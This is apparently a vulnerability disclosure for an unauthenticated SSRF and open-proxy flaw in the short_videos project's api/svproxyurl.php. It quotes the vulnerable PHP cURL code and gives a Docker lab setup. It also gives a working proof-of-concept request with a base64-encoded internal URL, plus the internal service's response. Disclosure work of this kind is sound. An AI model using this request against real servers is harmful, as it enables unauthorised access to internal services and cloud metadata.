short_videos ssrf Vulnerability

April 29, 2026

Title: Server-Side Request Forgery (SSRF) Vulnerability in short_videos via api/svproxyurl.php#

BUG_Author: liuhanzhi

Affected Version: short_videos (latest unpatched version as of 2026-04-29)

Vendor: short_videos GitHub Repository

Software: short_videos

Vulnerability Files:

  • api/svproxyurl.php

Description:#

  1. Unauthenticated SSRF / Open Proxy in api/svproxyurl.php:

    • In api/svproxyurl.php, the application accepts a user-controlled proxyurl parameter from $_GET or $_POST.
    • The value is decoded by base64_decode() and then passed directly into CURLOPT_URL inside both weibo_proxy() and douyin_proxy().
    • No authentication, host allowlist, private-network restriction, or redirect target validation is implemented.

  2. Cause of the vulnerability:

    • The backend directly trusts the user-supplied target URL.
    • The code allows the server to initiate outbound requests to arbitrary destinations.
    • The response body is streamed back to the external requester, which makes the issue not only SSRF but also an open proxy behavior.
    • The code enables CURLOPT_FOLLOWLOCATION, which may further expand the reachable target surface through redirects.

  3. Affected code paths:

    • main() reads and decodes proxyurl:
      • api/svproxyurl.php:18-29
    • weibo_proxy() uses the attacker-controlled value as request destination:
      • api/svproxyurl.php:49-140
    • douyin_proxy() uses the attacker-controlled value as request destination:
      • api/svproxyurl.php:143-235

  4. Impact:

    • An unauthenticated attacker can force the server to access internal network services.
    • The vulnerability can be used for internal port discovery, access to internal HTTP services, and retrieval of internal responses.
    • In real deployment scenarios, this may expose Docker internal services, localhost-only applications, cloud metadata endpoints, or other trusted network resources.

  5. Why the issue is exploitable:

    • No login is required.
    • The destination is user-controlled.
    • The backend performs the request on behalf of the attacker.
    • The backend returns the fetched response body to the attacker.

Vulnerable Code:#

  1. User-controlled proxyurl is read and decoded in main():
function main()
{
    $params = [];
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $params = $_GET;
    } elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $params = $_POST;
    }

    $proxyurl = base64_decode(getParam($params, 'proxyurl', ''));
    $type = getParam($params, 'type', 'douyin');

    if ($type === 'weibo') {
        weibo_proxy($proxyurl);
    } else {
        douyin_proxy($proxyurl);
    }
}
  1. The attacker-controlled URL is directly assigned to CURLOPT_URL in weibo_proxy():
curl_setopt_array($ch, [
    CURLOPT_URL            => $proxyurl,
    CURLOPT_RETURNTRANSFER => false,
    CURLOPT_HTTPHEADER     => $baseHeaders,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_TIMEOUT        => 1800,
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_WRITEFUNCTION  => function ($ch, $data) {
        echo $data;
        if (ob_get_length() > 0) ob_flush();
        flush();
        return strlen($data);
    }
]);
  1. The attacker-controlled URL is directly assigned to CURLOPT_URL in douyin_proxy():
curl_setopt_array($ch, [
    CURLOPT_URL => $proxyurl,
    CURLOPT_RETURNTRANSFER => false,
    CURLOPT_HTTPHEADER => $baseHeaders,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_TIMEOUT => 300,
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_WRITEFUNCTION => function ($ch, $data) {
        echo $data;
        if (ob_get_length() > 0) ob_flush();
        flush();
        return strlen($data);
    }
]);

  1. Key security issues shown by the code:

    • The target URL is fully attacker-controlled.
    • There is no allowlist validation for hosts or schemes beyond basic format checks.
    • Internal IP ranges and localhost are not blocked.
    • Redirections are followed.
    • The response body is streamed back to the requester.

Local Verification#

  1. Download the official source code:
git clone https://github.com/jiuhunwl/short_videos.git
cd short_videos
  1. Create a docker-compose.yml file in the project root to start the vulnerable PHP application and an internal-only test service:
services:
  web:
    image: php:8.2-apache
    container_name: short-videos-web
    ports:
      - "8080:80"
    volumes:
      - ./:/var/www/html
    networks:
      audit_net:
        ipv4_address: 172.28.1.10

  whoami:
    image: traefik/whoami:v1.10
    container_name: short-videos-whoami
    networks:
      audit_net:
        ipv4_address: 172.28.1.20

networks:
  audit_net:
    ipam:
      config:
        - subnet: 172.28.1.0/24
  1. Start the Docker containers:
docker compose up -d
  1. Confirm the vulnerable endpoint is reachable:
curl "http://localhost:8080/api/svproxyurl.php"
  1. Prepare a target URL that is only reachable from the Docker internal network:
printf 'http://172.28.1.20/' | base64

Expected output:

aHR0cDovLzE3Mi4yOC4xLjIwLw==
  1. Send the verification request to the vulnerable endpoint:
curl "http://localhost:8080/api/svproxyurl.php?type=douyin&proxyurl=aHR0cDovLzE3Mi4yOC4xLjIwLw=="

Proof of Concept:#

  1. Send the following request to the target:
GET /api/svproxyurl.php?type=douyin&proxyurl=aHR0cDovLzE3Mi4yOC4xLjIwLw== HTTP/1.1
Host: <target-host>
User-Agent: Mozilla/5.0
Connection: close
  1. Observe the response content. A successful response in the local Docker verification is shown below:
Hostname: f190864611a5
IP: 127.0.0.1
IP: ::1
IP: 172.28.1.20
RemoteAddr: 172.28.1.10:42598
GET / HTTP/1.1
Host: 172.28.1.20
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: video/mp4,video/x-m4v,video/*;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Referer: https://douyin.com/

  1. Verification points:

    • The external request is sent to http://localhost:8080, not directly to 172.28.1.20.
    • The returned body is generated by the internal whoami container.
    • RemoteAddr: 172.28.1.10:42598 proves the request to the internal service was initiated by the vulnerable PHP container.
    • Host: 172.28.1.20 proves the backend reached the Docker internal address.

  2. Conclusion:

    • The endpoint can be abused by an unauthenticated attacker to make the server access arbitrary internal HTTP resources and return the response.
    • This confirms a valid SSRF vulnerability with open proxy behavior.
